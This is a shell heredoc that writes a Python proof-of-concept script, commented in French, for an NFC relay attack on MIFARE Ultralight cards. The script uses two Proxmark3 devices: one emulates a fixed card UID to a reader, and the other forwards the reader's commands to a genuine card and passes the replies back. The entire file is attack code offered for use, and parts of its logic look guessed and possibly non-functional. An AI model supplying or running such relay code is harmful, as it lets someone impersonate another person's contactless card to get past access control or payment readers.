cat << 'EOF' > pm3_relay.py
import serial
import time
import re

# CONFIGURATION
PROXY_PORT = "COM9"
MOLE_PORT = "COM10"
BAUD = 460800 # Vitesse standard Proxmark3

def send_cmd(ser, cmd):
    ser.write((cmd + "\n").encode())

def clean_hex(line):
    # Extrait uniquement les trames hexadécimales des logs PM3
    match = re.search(r'\]\s+([0-9A-Fa-f\s]{2,})', line)
    if match:
        return match.group(1).replace(" ", "").strip()
    return None

def start_relay():
    print("=== POC RELAI PROXMARK3 ULTRALIGHT ===")
    try:
        
        proxy = serial.Serial(PROXY_PORT, BAUD, timeout=0.01)
        mole = serial.Serial(MOLE_PORT, BAUD, timeout=0.01)
        print("[*] Ports série ouverts.")

        # 1. Initialisation de l'UID sur le Proxy
        # On suppose que tu connais l'UID (ex: 045978CA341290)
        uid = "045978CA341290"
        print(f"[*] Simulation de l'UID {uid}...")
        send_cmd(proxy, f"hf 14a sim -t 2 -u {uid}")
        time.sleep(1) 

        print("[*] Relai actif. En attente du lecteur...")

        while True:
            # LECTURE DU PROXY (Lecteur -> PC)
            print("[*] Surveillance du Proxy...")
            line_proxy = proxy.readline().decode(errors='ignore')
            print(f"DEBUG PROXY: '{line_proxy.strip()}'")
            if line_proxy and "dist" in line_proxy.lower(): # Souvent le mot clé dans les logs de sim
                cmd_hex = clean_hex(line_proxy)
                
                if cmd_hex and len(cmd_hex) >= 4:
                    print(f"Lecteur -> [Proxy]: {cmd_hex}")

                    # ENVOI AU MOLE (PC -> Carte)
                    # On utilise 'hf 14a raw' car c'est le plus rapide pour une commande brute
                    send_cmd(mole, f"hf 14a raw -c {cmd_hex}")
                    
                    # LECTURE DU MOLE (Carte -> PC)
                    # On boucle brièvement pour choper la réponse de la carte
                    start_t = time.time()
                    while (time.time() - start_t) < 0.1: # Timeout 100ms
                        line_mole = mole.readline().decode(errors='ignore')
                        res_hex = clean_hex(line_mole)
                        if res_hex:
                            print(f" [Mole] -> Carte: {res_hex}")
                            # INJECTION DANS LE PROXY (PC -> Lecteur)
                            send_cmd(proxy, f"hf 14a raw {res_hex}")
                            break

    except KeyboardInterrupt:
        print("\n[*] Arrêt...")
    finally:
        proxy.close()
        mole.close()

if __name__ == "__main__":
    start_relay()
EOF